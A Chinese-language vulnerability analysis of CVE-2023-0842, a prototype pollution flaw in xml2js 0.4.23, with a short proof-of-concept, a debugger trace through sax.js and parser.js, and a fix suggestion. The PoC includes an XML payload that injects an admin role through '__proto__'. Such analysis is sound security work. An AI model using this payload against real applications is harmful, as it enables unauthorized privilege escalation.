#### 漏洞信息

xml2js 0.4.23 Prototype Pollution

CVE-2023-0842

影响版本范围：xml2js <= 0.4.23

Severity: High

Credits: The vulnerability was discovered by Carlos Bello from Fluid Attacks'
Offensive Team.

Release date: 2023-04-10

漏洞成因：  
xml2js 0.4.23没有正确验证传入的JSON keys(键)，从而允许编辑`__proto__`属性，从而允许外部攻击者编辑对象或向对象添加新属性。

xml2js version 0.4.23 allows an external attacker to edit or add new
properties to an object. This is possible because the application does not
properly validate incoming JSON keys, thus allowing the `__proto__` property
to be edited.

相关链接：  
<https://github.com/Leonidas-from-XIV/node-xml2js/issues/663>

#### 漏洞类型

原型污染是影响JS的一种漏洞。当第三方设法修改object的`__PROTO__`时触发。

JavaScript首先检查对象中是否存在这样的方法/属性。

如果存在，则会调用它。  
如果不存在，它会查看该对象的原型。如果该方法/属性也不在对象的原型中，则称该属性未定义。

因此，如果攻击者成功将`__proto__`属性注入对象，则他将成功注入或编辑其属性。

#### 简单测试

poc

    
    
    var parseString = require('xml2js').parseString;
    
    const update_user = (userProp) => {
        // design: A user cannot alter his role. This way we prevent privilege escalations.
        parseString(userProp, function (err, user) {
            if(user.hasOwnProperty("role") && user?.role.toLowerCase() === "admin") {
                console.log("Unauthorized Action");
            } else {
                console.log(user?.role[0]);
            }
        });
    }
    
    // normal
    let normal_user_request    = "<role>admin</role>";
    update_user(normal_user_request);
    
    // attacker
    let malicious_user_request = "<__proto__><role>admin</role></__proto__>";
    update_user(malicious_user_request);
    

运行以上脚本，输出结果：

    
    
    Unauthorized Action
    admin

截图：  
![](./img/6739634837006941802.png)

#### 漏洞分析

查看diff  
<https://github.com/Leonidas-from-XIV/node-xml2js/commit/581b19a62d88f8a3c068b5a45f4542c2d6a495a5#diff-11861fde44286dc4d6d46a6291a19fb7b342d21eec6bc9e9e229d736502996da>

有问题的代码如下：

具体debug过程：

(1)  
xml格式的字符串`<__proto__><role>admin</role></__proto__>`，传入到xml2js模块里的parseString函数。

![](./img/3161235970636807122.png)

(2)  
parseString函数的函数体内，调用了sax.js里的saxParser.write函数。  
![](./img/6388501832195553421.png)

(3)  
saxParser.write函数的函数体内，调用了sax.js里的openTag函数。  
![](./img/8295951596710346586.png)

(4)  
在sax.js里的openTag函数的函数体内，最下面那部分的代码行里，调用了sax.js里的emitNode函数。  
![](./img/4407417300257423087.png)

sax.js里的emitNode函数的函数体是

    
    
    function emitNode (parser, nodeType, data) {
        if (parser.textNode) closeText(parser)
        emit(parser, nodeType, data)
      }
    

可见，调用了sax.js里的emit函数，emit函数的函数体是

    
    
    function emit (parser, event, data) {
        parser[event] && parser[event](data)
      }
    

实际上，在此函数内，调用的就是`parser['onopentag'](data)`

![](./img/3037887599779540545.png)

(5)  
在文件parse.js里面，可见this.saxParser.onopentag的函数体如下:

    
    
    this.saxParser.onopentag = (function(_this) {
            return function(node) {
              var key, newValue, obj, processedKey, ref;
              obj = {};
              obj[charkey] = "";
              if (!_this.options.ignoreAttrs) {
                ref = node.attributes;
                for (key in ref) {
                  if (!hasProp.call(ref, key)) continue;
                  if (!(attrkey in obj) && !_this.options.mergeAttrs) {
                    obj[attrkey] = {};
                  }
                  newValue = _this.options.attrValueProcessors ? processItem(_this.options.attrValueProcessors, node.attributes[key], key) : node.attributes[key];
                  processedKey = _this.options.attrNameProcessors ? processItem(_this.options.attrNameProcessors, key) : key;
                  if (_this.options.mergeAttrs) {
                    _this.assignOrPush(obj, processedKey, newValue);
                  } else {
                    obj[attrkey][processedKey] = newValue;
                  }
                }
              }
              obj["#name"] = _this.options.tagNameProcessors ? processItem(_this.options.tagNameProcessors, node.name) : node.name;
              if (_this.options.xmlns) {
                obj[_this.options.xmlnskey] = {
                  uri: node.uri,
                  local: node.local
                };
              }
              return stack.push(obj);
            };
          }
    

执行了最关键的这一行代码`obj["#name"] = _this.options.tagNameProcessors ?
processItem(_this.options.tagNameProcessors, node.name) : node.name;`

之后，obj对象从

    
    
    {
      _: ""
    }

变成了

    
    
    {
      _: "",
      "#name": "__proto__",
    }

然后return，具体语句为`return stack.push(obj);`

如图  
![](./img/7893357096147253603.png)

此时调用栈

    
    
    <anonymous> (/Users/dxm/Downloads/node_js_demo2022/node_modules/xml2js/lib/parser.js:169)
    emit (/Users/dxm/Downloads/node_js_demo2022/node_modules/sax/lib/sax.js:624)
    emitNode (/Users/dxm/Downloads/node_js_demo2022/node_modules/sax/lib/sax.js:629)
    openTag (/Users/dxm/Downloads/node_js_demo2022/node_modules/sax/lib/sax.js:825)
    write (/Users/dxm/Downloads/node_js_demo2022/node_modules/sax/lib/sax.js:1278)
    exports.Parser.Parser.parseString (/Users/dxm/Downloads/node_js_demo2022/node_modules/xml2js/lib/parser.js:323)
    <anonymous> (/Users/dxm/Downloads/node_js_demo2022/node_modules/xml2js/lib/parser.js:5)
    exports.parseString (/Users/dxm/Downloads/node_js_demo2022/node_modules/xml2js/lib/parser.js:369)
    update_user (/Users/dxm/Downloads/node_js_demo2022/node_mod_vul_xml2js/test.js:5)
    <anonymous> (/Users/dxm/Downloads/node_js_demo2022/node_mod_vul_xml2js/test.js:20)
    Module._compile (internal/modules/cjs/loader:1275)
    Module._extensions..js (internal/modules/cjs/loader:1329)
    Module.load (internal/modules/cjs/loader:1133)
    Module._load (internal/modules/cjs/loader:972)
    executeUserEntryPoint (internal/modules/run_main:83)
    <anonymous> (internal/main/run_main_module:23)

#### 修复方案

禁止将来自XML内容的Proto的键添加到js对象中。

